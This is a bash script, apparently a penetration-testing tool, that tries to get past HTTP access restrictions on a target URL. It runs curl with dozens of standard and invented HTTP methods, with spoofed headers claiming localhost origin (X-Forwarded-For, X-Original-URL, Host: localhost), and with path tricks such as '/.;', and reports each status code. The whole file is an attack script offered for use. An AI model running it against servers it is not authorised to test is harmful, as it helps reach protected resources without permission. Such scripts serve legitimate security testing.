#!/usr/bin/bash
# Verb Tampering Part
echo " Start Verb Tampering"
verb=( GET POST PUT DELETE HEAD OPTIONS ACK SEARCH HELLO CHECKIN CHECKOUT CONNECT COPY DELETE GET HEAD INDEX LINK LOCK MKCOL MOVE NOEXISTE OPTIONS ORDERPATCH PATCH POST PROPFIND PROPPATCH PUT REPORT SEARCH SHOWMETHOD SPACEJUMP TEXTSEARCH TRACE TRACK UNCHECKOUT UNLINK UNLOCK VERSION-CONTROL )
for i in "${verb[@]}";
do
    echo "Using $i"
    echo " ---------"
    status=$(curl -I -L -s  -X "$i" $1 | head -n 1 | cut -d ' ' -f2)
    echo " return $status for $i"
    echo " ---------"
done
# Header Fuzzing
echo " Start Header Fuzzing"
headers=( "X-Originating-IP: 127.0.0.1" "X-Forwarded-For: 127.0.0.1" "X-Forwarded: 127.0.0.1" "Forwarded-For: 127.0.0.1" "X-Remote-IP: 127.0.0.1" "X-Remote-Addr: 127.0.0.1" "X-ProxyUser-Ip: 127.0.0.1" "X-Original-URL: 127.0.0.1" "Client-IP: 127.0.0.1" "True-Client-IP: 127.0.0.1" "Cluster-Client-IP: 127.0.0.1" "X-ProxyUser-Ip: 127.0.0.1" "Host: localhost" )
for i in "${headers[@]}";
do
    echo "set Header To $i "
    echo "--------"
    status=$(curl -s -I -L -H "$i" $1 | head -n 1 | cut -d ' ' -f2)
    echo " return $status for $i"
    echo " ---------"
done

# Path Fuzzing
echo " Start Path Fuzzing"
path=("/" "//" "/." "/;" "/.;" "." ";" ".;")
for i in "${path[@]}";
do
    echo " Trying $i"
    echo " ---------"
    status=$(curl -s -I -L "${1}${i}" | head -n 1 | cut -d ' ' -f2)
    echo "return $status for $i"
    echo " ------"
done
